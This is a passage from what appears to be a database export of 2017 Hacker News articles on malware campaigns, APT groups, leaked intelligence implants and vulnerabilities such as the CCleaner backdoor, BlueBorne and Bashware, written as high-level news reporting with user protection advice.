spied upon.\" Gamma Group has not yet responded to the ESET report." }

Earlier this week, when the CCleaner hack was reported, researchers assured users that there's no second stage malware used in the massive attack and affected users can simply update their version in order to get rid of the malicious software. However, during the analysis of the hackers' command-and-control (C2) server to which the malicious CCleaner versions connected, security researchers from Cisco's Talos Group found evidence of a second payload (GeeSetup_x86.dll, a lightweight backdoor module) that was delivered to a specific list of computers based on local domain names. Affected Technology Firms According to a predefined list mentioned in the configuration of the C2 server, the attack was designed to find computers inside the networks of the major technology firms and deliver the secondary payload. The target companies included: Google Microsoft Cisco Intel Samsung Sony HTC Linksys D-Link Akamai VMware In the database, researchers found a list of nearly 700,000 backdoored machines infected with the malicious version of CCleaner, i.e. the first-stage payload, and a list of at least 20 machines that were infected with the secondary payload to get a deeper foothold on those systems. The CCleaner hackers specifically chose these 20 machines based upon their Domain name, IP address, and Hostname. The researchers believe the secondary malware was likely intended for industrial espionage. CCleaner Malware Links to Chinese Hacking Group According to the researchers from Kaspersky, the CCleaner malware shares some code with the hacking tools used by a sophisticated Chinese hacking group called Axiom, also known as APT17, Group 72, DeputyDog, Tailgater Team, Hidden Lynx or AuroraPanda. \"The malware injected into #CCleaner has shared code with several tools used by one of the APT groups from the #Axiom APT 'umbrella',\" tweeted director of Global Research and Analysis Team at Kaspersky Lab. Cisco researchers also note that one configuration file on the attacker's server was set for China's time zone, which suggests China could be the source of the CCleaner attack. However, this evidence alone is not enough for attribution. Cisco Talos researchers also said that they have already notified the affected tech companies about a possible breach. Removing Malicious CCleaner Version would Not Help Just removing the Avast's software application from the infected machines would not be enough to get rid of the CCleaner second stage malware payload from their network, with the attackers' still-active C2 server. So, affected companies that have had their computers infected with the malicious version of CCleaner are strongly recommended to fully restore their systems from backup versions before the installation of the tainted security program. \"These findings also support and reinforce our previous recommendation that those impacted by this supply chain attack should not simply remove the affected version of CCleaner or update to the latest version, but should restore from backups or reimage systems to ensure that they completely remove not only the backdoored version of CCleaner but also any other malware that may be resident on the system,\" the researchers say. For those who are unaware, the Windows 32-bit version of CCleaner v5.33.6162 and CCleaner Cloud v1.07.3191 were affected by the malware, and affected users should update the software to version 5.34 or higher." }

According to the latest research published Wednesday by US security firm FireEye, an Iranian hacking group that it calls Advanced Persistent Threat 33 (or APT33) has been targeting critical infrastructure, energy and military sectors since at least 2013 as part of a massive cyber-espionage operation to gather intelligence and steal trade secrets. The security firm also says it has evidence that APT33 works on behalf of Iran's government. FireEye researchers have spotted cyber attacks aimed by APT33 since at least May 2016 and found that the group has successfully targeted aviation sector—both military and commercial—as well as organisations in the energy sector with a link to petrochemical. The APT33 victims include a U.S. firm in the aerospace sector, a Saudi Arabian business conglomerate with aviation holdings, and a South Korean company involved in oil refining and petrochemicals. Most recently, in May 2017, APT33 targeted employees of a Saudi organisation and a South Korean business conglomerate using a malicious file that attempted to entice them with job vacancies for a Saudi Arabian petrochemical company. \"We believe the targeting of the Saudi organisation may have been an attempt to gain insight into regional rivals, while the targeting of South Korean companies may be due to South Korea’s recent partnerships with Iran’s petrochemical industry as well as South Korea’s relationships with Saudi petrochemical companies,\" the FireEye report reads. APT33 targets organisations by sending spear phishing emails with malicious HTML links to infect targets' computers with malware. The malware used by the espionage group includes DROPSHOT (dropper), SHAPESHIFT (wiper) and TURNEDUP (custom backdoor, which is the final payload). However, in previous research published by Kaspersky, DROPSHOT was tracked by its researchers as StoneDrill, which targeted petroleum company in Europe and believed to be an updated version of Shamoon 2 malware. \"Although we have only directly observed APT33 use DROPSHOT to deliver the TURNEDUP backdoor, we have identified multiple DROPSHOT samples in the wild that drop SHAPESHIFT,\" the report reads. The SHAPESHIFT malware can wipe disks, erase volumes and delete files, depending on its configuration. According to FireEye, APT 33 sent hundreds of spear phishing emails last year from several domains, which masqueraded as Saudi aviation companies and international organisations, including Boeing, Alsalam Aircraft Company and Northrop Grumman Aviation Arabia. The security firm also believes APT 33 is linked to Nasr Institute, an Iranian government organisation that conducts cyber warfare operations. In July, researchers at Trend Micro and Israeli firm ClearSky uncovered another Iranian espionage group, dubbed Rocket Kittens, that was also active since 2013 and targeted organisations and individuals, including diplomats and researchers, in Israel, Saudi Arabia, Turkey, the United States, Jordan and Germany. However, FireEye report does not show any links between both the hacking group. For more technical details about the APT33 operations, you can head on to FireEye's official blog post." }

However, these networks have been a regular target in recent years for researchers, who have been trying to demonstrate every possible attack scenarios that could compromise the security of such isolated networks. Security researchers from Ben-Gurion University in Israel have previously demonstrated several ways to extract sensitive information from air-gapped computers. Now, the same University researchers have discovered another way to steal confidential information from air-gapped computers – this time with the help of infrared-equipped CCTV cameras that are used for night vision. Researchers have developed a new attack scenario, dubbed aIR-Jumper, which includes an infected air-gapped computer (from which data needs to be stolen) and an infected CCTV network (that has at least one CCTV installed inside the premises facing the infected computer and one outside the premises), assuming that both networks are isolated from each other, and none of them is Internet-connected. Ignoring the fact that how an air-gapped computer and CCTV network got infected with malware in the first place, the new research focused on, once infected, how the malware would be able to transfer the stolen data back to the attackers (waiting outside the premises). To read and send data, the aIR-Jumper malware installed on air-gapped computer and CCTV network blink IR LEDs in morse-code-like patterns to transmit files into the binary data, i.e. 0 and 1. The data from a video camera can be transmitted at 20 bits per second to an attacker at a distance of tens of meters away and from an attacker to a video camera at 100 bits per second, even in total darkness. Since the attack is meant to steal files in binary data, attackers wouldn’t be able to steal any large files but could get their hands on passwords, cryptographic keys, PIN codes and other small bits of sensitive data stored on the targeted computer. \"In an infiltration scenario, an attacker standing in a public area (e.g., in the street) uses IR LEDs to transmit hidden signals to the surveillance camera(s),\" the researchers say. \"Binary data such as command and control (C&C) and beacon messages are encoded on top of the IR signals.\" The researchers also published two videos demonstration, showing two attack scenarios. In the first video, the researchers demonstrated how the malware installed on the air-gap computer collected data, converted it into binary and then blinked LED accordingly. At the same time, the infected camera captured this pattern and the malware installed on the camera converted the morse-code back into the binary data. In the second video, another internally-connected camera installed outside the premises (in the parking area) transmitted the stolen binary data to the attackers sitting in the car using IR LED in morse-code-like patterns. Attackers can simply capture the blink of the CCTV using their own camera and can decrypt the data later. Here the infected CCTV camera is working as a bridge between the air-gapped computer and the remote attackers, offering a bi-directional covert channel. It's not the first time Ben-Gurion researchers came up with the technique to target air-gapped computers. Their previous research of hacking air-gap computers include: USBee attack that can be used steal data from air-gapped computers using radio frequency transmissions from USB connectors. DiskFiltration attack that can steal data using sound signals emitted from the hard disk drive (HDD) of the targeted air-gapped computer; BitWhisper that relies on heat exchange between two computer systems to stealthily siphon passwords or security keys; AirHopper that turns a computer's video card into an FM transmitter to capture keystrokes; Fansmitter technique that uses noise emitted by a computer fan to transmit data; and GSMem attack that relies on cellular frequencies.

Security researchers from SfyLabs have now discovered a new Android banking Trojan that is being rented on many dark websites for $500 per month, SfyLabs' researcher Han Sahin told The Hacker News. Dubbed Red Alert 2.0, the Android banking malware has been fully written from scratch, unlike other banking trojans, such as BankBot and ExoBot, which were evolved from the leaked source code of older trojans. The Red Alert banking malware has been distributed via many online hacking forums since last few months, and its creators have continuously been updating the malware to add new functionalities in an effort to make it a dangerous threat to potential victims. Malware Blocks Incoming Calls from Banks Like most other Android banking trojans, Red Alert has a large number of capabilities such as stealing login credentials, hijacking SMS messages, displaying an overlay on the top of legitimate apps, contact list harvesting, among others. Besides this, Red Alert actors have also added an interesting functionality to its malware, like blocking and logging all incoming calls associated with banks and financial associations. This would potentially allow the Red Alert malware to prevent warnings of a compromised account to be received by the victims from their associated banks. Malware Uses Twitter As Backup C&C Infrastructure Another most interesting thing about Red Alert 2.0 is that it uses Twitter to prevent losing bots when its command and control server is knocked offline. \"When the bot fails to connect to the hardcoded C2 it will retrieve a new C2 from a Twitter account,\" SfyLabs researchers said in a blog post. \"This is something we have seen in the desktop banking malware world before, but the first time we see it happening in an Android banking trojan.\" The Red Alert 2.0 is currently targeting victims from more than 60 banks and social media apps across the world and works on Android 6.0 (Marshmallow) and previous versions. Here's How the Red Alert 2.0 Trojan Works: Once installed on victim's phone via the third-party app store, the malware waits for the victim to open a banking or social media app, whose interface it can simulate, and once detected, the Trojan immediately overlays the original app with a fake user interface. The fake interface then informs the victim that there is an error while logging the user in and requests the user to re-authenticate his/her account. As soon as the user enters the credentials into the fake user interface, Red Alert records them and sends them to the attacker-controlled command and control (C&C) server to be used by the attackers to hijack the account. In case of banking apps, the recorded information is being used by attackers to initiate fraudulent transactions and drain the victim's bank account. Since Red Alert 2.0 can also intercept SMS text messages received by the infected smartphone, the trojan could work around two-factor authentication techniques that otherwise are designed to throttle such attacks. Ways to Protect Yourself Against Such Android Banking Trojans The easiest way to prevent yourself from being a victim of one such mobile banking Trojan is to avoid downloading apps via third-party app stores or links provided in SMS messages or emails. Just to be on the safer side, go to Settings → Security and make sure \"Unknown sources\" option is turned off on your Android device that blocks installation of apps from unknown sources. Most importantly, verify app permissions before installing any app, even from official Google Play Store, and if you find any application asking more than what it is meant for, just do not install it. It is always a good idea to install an anti-virus app from a reputed vendor that can detect and block such Trojan before it can infect your device. Also, always keep your system and apps up-to-date." }

CCleaner is a popular application with over 2 billion downloads, created by Piriform and recently acquired by Avast, that allows users to clean up their system to optimize and enhance performance. Security researchers from Cisco Talos discovered that the download servers used by Avast to let users download the application were compromised by some unknown hackers, who replaced the original version of the software with the malicious one and distributed it to millions of users for around a month. This incident is yet another example of supply chain attack. Earlier this year, update servers of a Ukrainian company called MeDoc were also compromised in the same way to distribute the Petya ransomware, which wreaked havoc worldwide. Avast and Piriform have both confirmed that the Windows 32-bit version of CCleaner v5.33.6162 and CCleaner Cloud v1.07.3191 were affected by the malware. Detected on 13 September, the malicious version of CCleaner contains a multi-stage malware payload that steals data from infected computers and sends it to attacker's remote command-and-control servers. Moreover, the unknown hackers signed the malicious installation executable (v5.33) using a valid digital signature issued to Piriform by Symantec and used Domain Generation Algorithm (DGA), so that if attackers' server went down, the DGA could generate new domains to receive and send stolen information. \"All of the collected information was encrypted and encoded by base64 with a custom alphabet,\" says Paul Yung, V.P. of Products at Piriform. \"The encoded information was subsequently submitted to an external IP address 216.126.x.x (this address was hardcoded in the payload, and we have intentionally masked its last two octets here) via a HTTPS POST request.\" The malicious software was programmed to collect a large number of user data, including: Computer name List of installed software, including Windows updates List of all running processes IP and MAC addresses Additional information like whether the process is running with admin privileges and whether it is a 64-bit system. How to Remove Malware From Your PC According to the Talos researchers, around 5 million people download CCleaner (or Crap Cleaner) each week, which indicates that more than 20 Million people could have been infected with the malicious version the app. \"The impact of this attack could be severe given the extremely high number of systems possibly affected. CCleaner claims to have over 2 billion downloads worldwide as of November 2016 and is reportedly adding new users at a rate of 5 million a week,\" Talos said. However, Piriform estimated that up to 3 percent of its users (up to 2.27 million people) were affected by the malicious installation. Affected users are strongly recommended to update their CCleaner software to version 5.34 or higher, in order to protect their computers from being compromised. The latest version is available for download here." }

The security issue, described by enSilo security researcher Omri Misgav, resides in the kernel routine \"PsSetLoadImageNotifyRoutine,\" which apparently impacts all versions of Windows operating systems since Windows 2000. Windows has a built-in API, called PsSetLoadImageNotifyRoutine, that helps programs monitor if any new module has been loaded into memory. Once registered, the program receives notification each time a module is loaded into memory. This notification includes the path to the module on disk. However, Misgav found that due to \"caching behaviour, along with the way the file-system driver maintains the file name and a severe coding error,\" the function doesn't always return the correct path of the loaded modules. What's bad? It seems like Microsoft has no plans to address this issue, as the software giant does not consider it as a security vulnerability. \"This bug could have security implications for those who aren’t aware of its existence. We believe that if Microsoft does not plan on fixing this bug, they should at least explicitly warn developers about it in their documentation,\" says Tal Liberman, head of the research team at enSilo. The researchers believe this \"programmatic error\" could theoretically be used by malware authors to bypass antivirus detection—especially those security products which rely on this API to check if any malicious code has been loaded into memory—using a \"series of file operations\" to mislead the scanning engine into looking at the wrong file. So, if your endpoint detection and response products rely on this buggy API, you should either consider not using it or must implement the workaround introduced by the researcher to overcome the loophole. In a separate blog post, Misgav advised software developers to use another Windows API (FltGetFileNameInformationUnsafe) to check the validity of the module's path using the file object parameter. If the file exists, it is possible to verify that the file object being loaded into memory is indeed the same file that lies on disk. For a more technical explanation, you can head on to enSilo's blog. In separate news, security researchers from Check Point reported about a new attack technique, dubbed Bashware, which takes advantage of Windows built-in Linux subsystem to hide malware from the most security solutions." }
{ "_id" : { "$oid" : "5b35bd646cefc42b002934bc" }, "Category" : "Malware", "Title" : "Yet Another Android Malware Infects Over 4.2 Million Google Play Store Users", "Address" : "https://thehackernews.com/2017/09/play-store-malware.html", "Date" : "2017-09-14T23:04:00-11:00", "Article" : "Even after so many efforts by Google, malicious apps somehow managed to fool its Play Store's anti-malware protections and infect people with malicious software. The same happened once again when at least 50 apps managed to make its way onto Google Play Store and were successfully downloaded as many as 4.2 million times—one of the biggest malware outbreaks. Security firm Check Point on Thursday published a blog post revealing at least 50 Android apps that were free to download on official Play Store and were downloaded between 1 million and 4.2 million times before Google removed them. These Android apps come with hidden malware payload that secretly registers victims for paid online services, sends fraudulent premium text messages from victims' smartphones and leaves them to pay the bill—all without the knowledge or permission of users. Dubbed ExpensiveWall by Check Point researchers because it was found in the Lovely Wallpaper app, the malware comes hidden in free wallpaper, video or photo editing apps. It's a new variant of malware that Mcafee spotted earlier this year on the Play Store. But what makes ExpensiveWall malware different from its other variants is that it makes use of an advanced obfuscation technique called \"packed,\" which compresses malicious code and encrypts it to evade Google Play Store's built-in anti-malware protections. The researchers notified Google of the malicious apps on August 7, and the software giant quickly removed all of them, but within few days, the malware re-emerged on the Play Store and infected over 5,000 devices before it was removed four days later, Check Point said. Here's How ExpensiveWall Malware Works: Once an app with ExpensiveWall—which researchers think came from a software development kit called GTK—is downloaded on a victim's device, the malicious app asks for user's permission to access the Internet, and send and receive SMS messages. The internet access is used by the malware to connect the victim's device to the attacker's command and control server, where it sends information on the infected handset, including its location alongside unique hardware identifiers, such as MAC and IP addresses, IMSI and IMEI numbers. The C&C server then sends the malware a URL, which it opens in an embedded WebView window to download JavaScript code that begins to clock up bills for the victim by sending fraudulent premium SMS messages without their knowledge, and uses the victim's phone number to register for paid services. However, according to the Check Point researchers, it is still unclear how much revenue was generated via ExpensiveWall's premium SMS scam. Google's Play Store—Home for Malware Android malware continues to evolve with more sophisticated and never-seen-before capabilities with every passing day, and spotting them on Google Play Store has become quite a common thing. Last month, over 500 Android apps with spyware capabilities were found on Play Store, which had been downloaded more than 100 million times. In July, Lipizzan spyware apps were spotted on Play Store that can steal a whole lot of information on users, including text messages, emails, voice calls, photos, location data, and other files, and spy on them. In June, more than 800 Xavier-laden apps were discovered on Google Play that had been downloaded millions of times, and the same month researchers found first code injecting rooting malware making rounds on Google Play Store. A month prior to it, researchers spotted 41 apps on Play Store hidden with the Judy Malware that infected 36.5 million Android devices with malicious ad-click software. In April, over 40 apps with hidden FalseGuide malware were spotted on Play Store that made 2 Million Android users victims. Earlier this year, researchers also discovered a new variant of the HummingBad malware, dubbed HummingWhale, hidden in more than 20 apps on Google Play Store, which were downloaded by over 12 Million users. How to Protect Your Android From Such Malware Apps Even after Google removed all the malware-tainted apps from its official Play Store marketplace, your smartphones will remain infected with the ExpensiveWall malware until you explicitly uninstall the malicious apps, if you have downloaded any. Google has recently provided a security feature known as Play Protect that uses machine learning and app usage analysis to automatically remove malicious apps from the affected smartphones to prevent further harm. However, according to the Check Point researchers, many phones run an older version of Android that does not support the feature, leaving a wide audience open to malware attacks. You are strongly advised to always keep a good antivirus app on your device that can detect and block any malicious app before it can infect your device, and always keep your device and all apps up-to-date." }
{ "_id" : { "$oid" : "5b35bd676cefc42b002934bd" }, "Category" : "Malware", "Title" : "Linux Subsystem on Windows 10 Allows Malware to Become Fully Undetectable", "Address" : "https://thehackernews.com/2017/09/windows-10-linux-evade-malware.html", "Date" : "2017-09-12T21:44:00-11:00", "Article" : "Microsoft has been expressing its love for Linux for almost three years now, and this love costs Microsoft an arm and a leg. Last year, Microsoft surprised everyone by announcing the arrival of Windows Subsystem for Linux (WSL) in Windows 10, which brings the Linux command-line shell to Windows, allowing users to run native Linux applications on Windows system without virtualization. However, security researchers from security firm Check Point Software Technologies have discovered a potential security issue with the WSL feature that could allow malware families designed for Linux target Windows computers—undetected by all current security software. The researchers devised a new attack technique, dubbed Bashware, that takes advantage of Windows' built-in WSL feature, which is now out of beta and is set to arrive in the Windows 10 Fall Creators Update in October 2017. Bashware Attack Undetectable by All Anti-Virus & Security Solutions According to CheckPoint researchers, the Bashware attack technique could be abused even by a known Linux malware family, because security solutions for Windows are not designed to detect such threats. This new attack could allow an attacker to hide any Linux malware from even the most common security solutions, including next generation anti-virus software, malware inspection tools, anti-ransomware solution and other tools. But why so? Researchers argue that existing security software packages for Windows systems have not yet been modified to monitor processes of Linux executables running on Windows operating system. \"Existing security solutions are still not adapted to monitor processes of Linux executables running on Windows OS, a hybrid concept which allows a combination of Linux and Windows systems to run at the same time,\" Check Point researchers say. \"This may open a door for cyber criminals wishing to run their malicious code undetected, and allow them to use the features provided by WSL to hide from security products that have not yet integrated the proper detection mechanisms.\" Who is the Culprit? Microsoft or Security Vendors? In order to run the target Linux application in an isolated environment, Microsoft introduced \"Pico processes\"—containers that allow running of ELF binaries on the Windows operating system. During their tests, the Check Point researchers were able to test the Bashware attack on \"most of the leading antivirus and security products on the market,\" and successfully bypass all of them. It is because no security product monitors Pico processes, even when Microsoft already provides Pico API, a special application programming interface that can be used by security companies to monitor such processes. \"Bashware does not leverage any logic or implementation flaws in WSL's design. In fact, WSL seems to be well designed,\" the researchers concluded. \"What allows Bashware to operate the way it does is the lack of awareness by various security vendors, due to the fact that this technology is relatively new and expands the known borders of the Windows operating system.\" Bashware Attackers Requires Admin Rights—Is that Hard on Windows PC? Yes, Bashware requires administrator access on the target computers, but gaining admin privileges on Windows PCs via phishing attacks and/or stolen admin credentials is not a difficult task for a motivated attacker. However, these additional attacks could also alert antivirus and security products, subverting the attack before the actual Bashware attack can be executed to hide malware. Since WSL is not turned on by default, and users are required to manually activate \"development mode\" on their computer systems in order to use it and reboot the system, the risks posed by the feature are mitigated to some extent. However, the Check Point researchers say it is a little-known fact that the developer mode can be enabled by modifying a few registry keys, which can be done silently in the background by the attackers with the right privileges. The Bashware attack technique automates the required procedures by silently loading the WSL components, enabling developer mode, even downloading and extracting the Linux file system from Microsoft's servers, and running malware. No Need to Write Separate Malware Programs What's interesting about Bashware? Hackers using Bashware are not required to write malware programs for Linux to run them through WSL on Windows computers. This extra effort is saved by the Bashware technique which installs a program called Wine inside the downloaded Ubuntu user-space environment, and then launches known Windows malware through it. The malware then initiates into Windows as pico processes, which will hide it from security software. 400 Million Computers Potentially Exposed to Bashware The newly discovered attack technique does not leverage any implementation of WSL vulnerability, but is due to the lack of interest and awareness by various security vendors towards WSL. Since the Linux shell is now available to Windows users, researchers believe that Bashware can potentially affect any of the 400 million PCs currently running Windows 10 across the world. Check Point researchers said their company had already upgraded its security solutions to combat such attacks and are urging other security vendors to modify and update their next-generation anti-virus and security solutions accordingly." }

Security researchers have just discovered total 8 zero-day vulnerabilities in Bluetooth protocol that impact more than 5.3 Billion devices—from Android, iOS, Windows and Linux to the Internet of things (IoT) devices—using the short-range wireless communication technology. Using these vulnerabilities, security researchers at IoT security firm Armis have devised an attack, dubbed BlueBorne, which could allow attackers to completely take over Bluetooth-enabled devices, spread malware, or even establish a \"man-in-the-middle\" connection to gain access to devices' critical data and networks without requiring any victim interaction. All an attacker need is for the victim's device to have Bluetooth turned on and obviously, in close proximity to the attacker's device. Moreover, successful exploitation doesn't even require vulnerable devices to be paired with the attacker's device. BlueBorne: Wormable Bluetooth Attack What's more worrisome is that the BlueBorne attack could spread like the wormable WannaCry ransomware that emerged earlier this year and wrecked havoc by disrupting large companies and organisations worldwide. Ben Seri, head of research team at Armis Labs, claims that during an experiment in the lab, his team was able to create a botnet network and install ransomware using the BlueBorne attack. However, Seri believes that it is difficult for even a skilled attacker to create a universal wormable exploit that could find Bluetooth-enabled devices, target all platform together and spread automatically from one infected device to others. \"Unfortunately, this set of capabilities is extremely desireable to a hacker. BlueBorne can serve any malicious objective, such as cyber espionage, data theft, ransomware, and even creating large botnets out of IoT devices like the Mirai Botnet or mobile devices as with the recent WireX Botnet,\" Armis said. \"The BlueBorne attack vector surpasses the capabilities of most attack vectors by penetrating secure \"air-gapped\" networks which are disconnected from any other network, including the internet.\" Apply Security Patches to Prevent Bluetooth Hacking The security firm responsibly disclosed the vulnerabilities to all the major affected companies a few months ago—including Google, Apple and Microsoft, Samsung and Linux Foundation. These vulnerabilities include: Information Leak Vulnerability in Android (CVE-2017-0785) Remote Code Execution Vulnerability (CVE-2017-0781) in Android's Bluetooth Network Encapsulation Protocol (BNEP) service Remote Code Execution Vulnerability (CVE-2017-0782) in Android BNEP's Personal Area Networking (PAN) profile The Bluetooth Pineapple in Android—Logical flaw (CVE-2017-0783) Linux kernel Remote Code Execution vulnerability (CVE-2017-1000251) Linux Bluetooth stack (BlueZ) information leak vulnerability (CVE-2017-1000250) The Bluetooth Pineapple in Windows—Logical flaw (CVE-2017-8628) Apple Low Energy Audio Protocol Remote Code Execution vulnerability (CVE Pending) Google and Microsoft have already made security patches available to their customers, while Apple iOS devices running the most recent version of its mobile operating system (that is 10.x) are safe. “Microsoft released security updates in July and customers who have Windows Update enabled and applied the security updates, are protected automatically. We updated to protect customers as soon as possible, but as a responsible industry partner, we withheld disclosure until other vendors could develop and release updates.” – a Microsoft spokesperson said. What's worst? All iOS devices with 9.3.5 or older versions and over 1.1 Billion active Android devices running older than Marshmallow (6.x) are vulnerable to the BlueBorne attack. Moreover, millions of smart Bluetooth devices running a version of Linux are also vulnerable to the attack. Commercial and consumer-oriented Linux platform (Tizen OS), BlueZ and 3.3-rc1 are also vulnerable to at least one of the BlueBorne bugs. Android users need to wait for security patches for their devices, as it depends on your device manufacturers. In the meantime, they can install \"BlueBorne Vulnerability Scanner\" app (created by Armis team) from Google Play Store to check if their devices are vulnerable to BlueBorne attack or not. If found vulnerable, you are advised to turn off Bluetooth on your device when not in use." }

Dubbed UNITEDRAKE, the implant is a \"fully extensible remote collection system\" that comes with a number of \"plug-ins,\" enabling attackers to remotely take full control over targeted Windows computers. In its latest post, the hacking group announced a few changes to its monthly dump service and released encrypted files from the previous months as well. Notably, the September dump also includes an unencrypted PDF file, which is a user manual for the UNITEDRAKE (United Rake) exploit developed by the NSA. According to the leaked user manual, UNITEDRAKE is a customizable modular malware with the ability to capture webcam and microphone output, log keystrokes, access external drives and more in order to spy on its targets. The tool consists of five components—server (a Listening Post), the system management interface (SMI), the database (to store and manage stolen information), the plug-in modules (allow the system capabilities to be extended), and the client (the implant). Snowden Leak Also Mentions UNITEDRAKE UNITEDRAKE initially came to light in 2014 as a part of NSA's classified documents leaked by its former contractor Edward Snowden. The Snowden documents suggested the agency used the tool alongside other pieces of malware, including CAPTIVATEDAUDIENCE, GUMFISH, FOGGYBOTTOM, GROK, and SALVAGERABBIT, to infect millions of computers around the world. CAPTIVATEDAUDIENCE is for recording conversations via the infected computer's microphone GUMFISH is for covertly taking control over a computer’s webcam and snap photographs FOGGYBOTTOM for exfiltrating Internet data like browsing histories, login details and passwords GROK is a Keylogger Trojan for capturing keystrokes. SALVAGERABBIT is for accessing data on removable flash drives that connect to the infected computer. New Terms for Shadow Brokers Monthly Dump Service The Shadow Brokers is now only accepting payments in ZCash (ZEC) from its monthly subscribers, rather than Monero since it uses clear text email for delivery, and has also raised the rates for exploits, demanding nearly $4 Million. The group demanded 100 ZEC when it started its first monthly dump service in June, but now the hackers are demanding 16,000 ZEC (which costs $3,914,080 in total) for all NSA dumps. Zcash currently trades at $248 per unit. Those who want to gain access only to the September dump that includes the new NSA malware files need to pay hackers 500 ZEC. The Shadow Brokers gained popularity after leaking the SMB zero-day exploit, called Eternalblue, that powered Wannacry ransomware attack that crippled large businesses and services around the world in May. After that, the mysterious hacking group announced a monthly data dump service for those who want to get exclusive access to the NSA arsenal, which they claim to have stolen from the agency last year." }

As part of its Vault 7 leaks, WikiLeaks today revealed details about a new implant developed by the CIA, dubbed AngelFire, to target computers running Windows operating system. AngelFire framework implants a persistent backdoor on the target Windows computers by modifying their partition boot sector. AngelFire framework consists five following components: 1. Solartime — it modifies the partition boot sector to load and execute the Wolfcreek (kernel code) every time the system boots up. 2. Wolfcreek — a self-loading driver (kernel code that Solartime executes) that loads other drivers and user-mode applications 3. Keystone — a component that utilizes DLL injection technique to execute the malicious user applications directly into system memory without dropping them into the file system. 4. BadMFS — a covert file system that attempts to install itself in non-partitioned space available on the targeted computer and stores all drivers and implants that Wolfcreek starts. 5. Windows Transitory File system — a new method of installing AngelFire, which allows the CIA operator to create transitory files for specific tasks like adding and removing files to AngelFire, rather than laying independent components on disk. According to a user manual leaked by WikiLeaks, AngelFire requires administrative privileges on a target computer for successful installation. The 32-bit version of implant works against Windows XP and Windows 7, while the 64-bit implant can target Server 2008 R2, Windows 7. Previous Vault 7 CIA Leaks Last week, WikiLeaks published another CIA project, dubbed ExpressLane, which detailed about the spying software that the CIA agents used to spy on their intelligence partners around the world, including FBI, DHS and the NSA. Since March, WikiLeaks has published 22 batches of \"Vault 7\" series, which includes the latest and last week leaks, along with the following batches: CouchPotato — A CIA project that revealed its ability to spy on video streams remotely in real-time. Dumbo — A CIA project that disclosed its ability to hijack and manipulate webcams and microphones to corrupt or delete recordings. Imperial — A CIA project that revealed details of 3 CIA-developed hacking tools and implants designed to target computers running Apple Mac OS X and different flavours of Linux OS. UCL/Raytheon — An alleged CIA contractor that analysed in-the-wild advanced malware and submitted at least five reports to the agency for help it develops its malware. Highrise — An alleged CIA project that allowed the US agency to stealthy collect and forward stolen data from compromised smartphones to its server via SMS messages. BothanSpy and Gyrfalcon — Two alleged CIA implants that allowed the spy agency to intercept and exfiltrate SSH credentials from targeted Windows and Linux computers using different attack vectors. OutlawCountry — An alleged CIA project that allowed the agency to hack and remotely spy on computers running Linux operating systems.

Active since 2016, the malware campaign is leveraging a new backdoor, dubbed Gazer, and is believed to be carried out by Turla advanced persistent threat (APT) hacking group that's been previously linked to Russian intelligence. Gazer, written in C++, the backdoor delivers via spear phishing emails and hijacks targeted computers in two steps—first, the malware drops Skipper backdoor, which has previously been linked to Turla and then installs Gazer components. In previous cyber espionage campaigns, the Turla hacking group used Carbon and Kazuar backdoors as its second-stage malware, which also has many similarities with Gazer, according to research [PDF] published by ESET. Gazer receives encrypted commands from a remote command-and-control server and evades detection by using compromised, legitimate websites (that mostly use the WordPress CMS) as a proxy. Instead of using Windows Crypto API, Gazer uses custom 3DES and RSA encryption libraries to encrypt the data before sending it to the C&C server—a common tactic employed by the Turla APT group. Gazer uses code-injection technique to take control of a machine and hide itself for a long period of time in an attempt to steal information. Gazer backdoor also has the ability to forward commands received by one infected endpoint to the other infected machines on the same network. So far ESET researchers have identified four different variants of the Gazer malware in the wild, primarily spying on Southeast European and former Soviet bloc political targets. Interestingly, earlier versions of Gazer were signed with a valid certificate issued by Comodo for \"Solid Loop Ltd,\" while the latest version is signed with an SSL certificate issued to \"Ultimate Computer Support Ltd.\" According to researchers, Gazer has already managed to infect a number of targets worldwide, with the most victims being located in Europe. Meanwhile, Kaspersky lab has also published almost similar details about Gazer backdoor, but they called it 'Whitebear' APT campaign." }

LabVIEW, developed by American company National Instruments, is a visual programming language and powerful system-design tool that is being used worldwide in hundreds of fields and provides engineers with a simple environment to build measurement or control systems Security researchers from Cisco's Talos Security Intelligence have discovered a critical vulnerability in LabVIEW software that could allow attackers to execute malicious code on a target computer, giving them full control of the system. Identified as CVE-2017-2779, the code execution vulnerability could be triggered by opening a specially crafted VI file, a proprietary file format used by LabVIEW. The vulnerability originates because of memory corruption issue in the RSRC segment parsing functionality of LabVIEW. Modulating the values within the RSRC segment of a VI file causes a controlled looping condition, which results in an arbitrary null write. \"A specially crafted LabVIEW virtual instrument file (with the *.vi extension) can cause an attacker controlled looping condition resulting in an arbitrary null write,\" Talos researchers explain. \"An attacker controlled VI file can be used to trigger this vulnerability and can potentially result in code execution.\" Talos researchers have successfully tested the vulnerability on LabVIEW 2016 version 16.0, but National Instruments has refused to consider this issue as a vulnerability in their product and had no plans to release any patch to address the flaw. However, the issue should not be ignored, because the threat vector is almost similar to many previously disclosed Microsoft Office vulnerabilities, in which victims got compromised after opening malicious MS Word file received via an email or downloaded from the Internet. \"The consequences of a successful compromise of a system that interacts with the physical world, such as a data acquisition and control systems, may be critical to safety,\" the researchers write. \"Organisations that deploy such systems, even as pilot projects, should be aware of the risk posed by vulnerabilities such as these and adequately protect systems.\" Since there is no patch available, the LabVIEW users are left with only one option—be very careful while opening any VI file you receive via an email. For more technical details about the vulnerability, you can head on to Cisco Talos' advisory." }

Security researchers at Kaspersky Lab have spotted an ongoing cross-platform campaign on Facebook Messenger, where users receive a video link that redirects them to a fake website, luring them to install malicious software. Although it is still unclear how the malware spreads, researchers believe spammers are using compromised accounts, hijacked browsers, or clickjacking techniques to spread the malicious link. The attackers make use of social engineering to trick users into clicking the video link, which purports to be from one of their Facebook friends, with the message that reads \"< your friend name > Video\" followed by a bit.ly link, as shown. Here's How this Cross-Platform Malware Works: The URL redirects victims to a Google doc that displays a dynamically generated video thumbnail, like a playable movie, based on the sender's images, which if clicked, further redirects users to another customised landing page depending upon their browser and operating system. For example, Mozilla Firefox users on Windows are redirected to a website displaying a fake Flash Player Update notice, and then offered a Windows executable, which is flagged as adware software. Google Chrome users are redirected to a website that masquerades as YouTube with similar YouTube logo, which displays a fake error message popup, tricking victims into downloading a malicious Chrome extension from the Google Web Store. The extension actually is a downloader that downloads a file of attacker's choice to the victim's computer. \"At the time of writing, the file which should have been downloaded was not available,\" David Jacoby, a chief security researcher from Kaspersky Lab, writes in a blog post published today. \"One interesting finding is that the Chrome Extension has log files from the developers displaying usernames. It is unclear if this is related to the campaign, but it is still an amusing 